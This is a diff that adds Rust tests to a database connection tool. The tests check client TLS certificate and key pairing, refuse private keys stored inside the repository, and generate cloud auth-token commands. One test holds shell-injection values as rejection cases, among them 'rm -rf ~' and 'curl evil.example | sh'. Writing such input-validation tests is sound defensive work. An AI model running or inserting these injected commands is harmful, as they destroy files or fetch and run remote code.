@@ -600,6 +600,8 @@ fn postgres_draft() -> ConnectionDraft {
         password: PasswordChoice::Keychain,
         tls_mode: TlsModeConfig::VerifyFull,
         tls_ca: String::new(),
+        tls_cert: String::new(),
+        tls_key: String::new(),
         tunnel: String::new(),
         kubernetes: None,
         sqlite3: String::new(),
@@ -1171,6 +1173,8 @@ fn kubernetes_connection(resource: &str) -> ConnectionDraft {
         password: PasswordChoice::Prompt,
         tls_mode: TlsModeConfig::Disable,
         tls_ca: String::new(),
+        tls_cert: String::new(),
+        tls_key: String::new(),
         tunnel: String::new(),
         sqlite3: String::new(),
         kubernetes: Some(KubernetesDraft {
@@ -1951,4 +1955,181 @@ fn the_teams_known_hosts_is_used_only_as_trusted() {
     assert_eq!(known(&trust).unwrap(), None);
     std::fs::write(&hosts, TEAM_HOSTS).unwrap();
     assert!(changed(known(&trust).map(|_| ())).new);
+}
+
+#[test]
+fn client_certificates_come_in_pairs_and_keys_stay_out_of_the_repository() {
+    let fx = Fixture::new("client-cert");
+    let base = "schema_version = 1\nengine = \"postgres\"\nhost = \"db\"\ndatabase = \"d\"\nuser = \"ops\"\n";
+    fx.write(
+        "repo/.spelunk/connections/alone.toml",
+        &format!("{base}\n[tls]\ncert = \"certs/ops.crt\"\n"),
+    );
+    fx.write(
+        "repo/.spelunk/connections/mssql.toml",
+        "schema_version = 1\nengine = \"sqlserver\"\nhost = \"db\"\nuser = \"ops\"\n\n[tls]\ncert = \"a.crt\"\nkey = \"~/a.key\"\n",
+    );
+    fx.write(
+        "repo/.spelunk/connections/leaked.toml",
+        &format!("{base}\n[tls]\ncert = \"certs/ops.crt\"\nkey = \"certs/ops.key\"\n"),
+    );
+    fx.write("repo/.spelunk/connections/good.toml", &format!("{base}\n[tls]\nmode = \"verify-full\"\ncert = \"certs/ops.crt\"\nkey = \"~/.spelunk-test/ops.key\"\n"));
+    let config = load(Some(&fx.repo()), &fx.user());
+    let problems: Vec<String> = config.problems.iter().map(|p| p.to_string()).collect();
+    assert!(
+        problems
+            .iter()
+            .any(|p| p.contains("alone.toml") && p.contains("go together")),
+        "{problems:?}"
+    );
+    assert!(
+        problems
+            .iter()
+            .any(|p| p.contains("mssql.toml") && p.contains("SQL Server does not")),
+        "{problems:?}"
+    );
+
+    let trust = fx.trusted();
+    let backend = FakeBackend::default();
+    let resolver = Resolver::new(&config, &trust, &backend);
+    match resolver.resolve(&ws("leaked")) {
+        Err(ResolveError::Config(e)) => {
+            assert!(e.to_string().contains("inside the repository"), "{e}")
+        }
+        other => panic!(
+            "a key in the repository must be refused: {:?}",
+            other.map(|_| ())
+        ),
+    }
+    let good = resolver.resolve(&ws("good")).unwrap();
+    assert_eq!(
+        good.params.client_certificate,
+        Some(fx.repo().join("certs/ops.crt"))
+    );
+    let key = good.params.client_key.unwrap();
+    assert!(
+        key.ends_with(".spelunk-test/ops.key") && !key.starts_with(fx.repo()),
+        "{key:?}"
+    );
+
+    // The form keeps a repository key absolute (so it is refused, not shared) and writes a
+    // key in the home directory as `~/…`.
+    let draft = |key: String| ConnectionDraft {
+        tls_cert: fx.repo().join("certs/ops.crt").display().to_string(),
+        tls_key: key,
+        ..postgres_draft()
+    };
+    let file = draft(fx.repo().join("certs/ops.key").display().to_string())
+        .to_file(&config)
+        .unwrap();
+    assert_eq!(file.tls.cert.as_deref(), Some("certs/ops.crt"));
+    assert!(Path::new(file.tls.key.as_deref().unwrap()).is_absolute());
+    let home = std::env::var_os(if cfg!(windows) { "USERPROFILE" } else { "HOME" }).unwrap();
+    let in_home = Path::new(&home)
+        .join(".ssl")
+        .join("ops.key")
+        .display()
+        .to_string();
+    let file = draft(in_home).to_file(&config).unwrap();
+    assert_eq!(file.tls.key.as_deref(), Some("~/.ssl/ops.key"));
+}
+
+#[test]
+fn cloud_tokens_write_a_safe_command_and_come_back_to_the_form() {
+    use spelunk_config::CloudToken;
+    let fx = Fixture::new("cloud-token");
+    let config = load(Some(&fx.repo()), &fx.user());
+    let draft = |token: CloudToken, host: &str, user: &str| ConnectionDraft {
+        host: host.into(),
+        user: user.into(),
+        port: None,
+        password: PasswordChoice::CloudToken(token),
+        ..postgres_draft()
+    };
+    let secret = |d: ConnectionDraft| d.to_file(&config).map(|f| f.password.unwrap().secret);
+
+    assert_eq!(
+        secret(draft(
+            CloudToken::AwsRds,
+            "orders.c9akciq32.eu-west-1.rds.amazonaws.com",
+            "ops_iam"
+        ))
+        .unwrap(),
+        "cmd:aws rds generate-db-auth-token --hostname orders.c9akciq32.eu-west-1.rds.amazonaws.com --port 5432 --username ops_iam --region eu-west-1"
+    );
+    // Not an RDS name: the CLI's default region.
+    assert_eq!(
+        secret(draft(CloudToken::AwsRds, "db.internal", "ops")).unwrap(),
+        "cmd:aws rds generate-db-auth-token --hostname db.internal --port 5432 --username ops"
+    );
+    assert!(
+        secret(draft(
+            CloudToken::AzureAd,
+            "x.postgres.database.azure.com",
+            "ops@contoso.com"
+        ))
+        .unwrap()
+        .starts_with("cmd:az account get-access-token")
+    );
+    assert_eq!(
+        secret(draft(
+            CloudToken::GoogleCloudSql,
+            "10.0.0.3",
+            "ops@example.iam"
+        ))
+        .unwrap(),
+        "cmd:gcloud sql generate-login-token"
+    );
+
+    // Nothing that a shell would read as more than a name gets into the command.
+    for (host, user) in [
+        ("db; rm -rf ~", "ops"),
+        ("db", "ops && curl evil.example | sh"),
+        ("db", "$(whoami)"),
+        ("db`id`", "ops"),
+        ("", "ops"),
+    ] {
+        let err = secret(draft(CloudToken::AwsRds, host, user)).unwrap_err();
+        assert!(
+            err.to_string().contains("can only contain"),
+            "{host} {user}: {err}"
+        );
+    }
+    let sqlserver = ConnectionDraft {
+        engine: Engine::Sqlserver,
+        ..draft(CloudToken::AzureAd, "db", "ops")
+    };
+    assert!(
+        secret(sqlserver)
+            .unwrap_err()
+            .to_string()
+            .contains("not sqlserver")
+    );
+
+    // Saved and opened again, the form shows the token, not a raw command; a hand-written
+    // command stays a command.
+    let token = draft(
+        CloudToken::AwsRds,
+        "orders.c9akciq32.eu-west-1.rds.amazonaws.com",
+        "ops_iam",
+    );
+    let id = add_connection(&config, &token, None, &FakeBackend::default()).unwrap();
+    let config = load(Some(&fx.repo()), &fx.user());
+    assert_eq!(
+        ConnectionDraft::from_entry(config.connection(&id).unwrap()).password,
+        PasswordChoice::CloudToken(CloudToken::AwsRds)
+    );
+    let handmade = ConnectionDraft {
+        name: "Handmade".into(),
+        password: PasswordChoice::Other(
+            "cmd:aws rds generate-db-auth-token --hostname other".into(),
+        ),
+        ..token.clone()
+    };
+    let id = add_connection(&config, &handmade, None, &FakeBackend::default()).unwrap();
+    let config = load(Some(&fx.repo()), &fx.user());
+    assert!(matches!(
+        ConnectionDraft::from_entry(config.connection(&id).unwrap()).password,
+        PasswordChoice::Other(_)
+    ));
 }
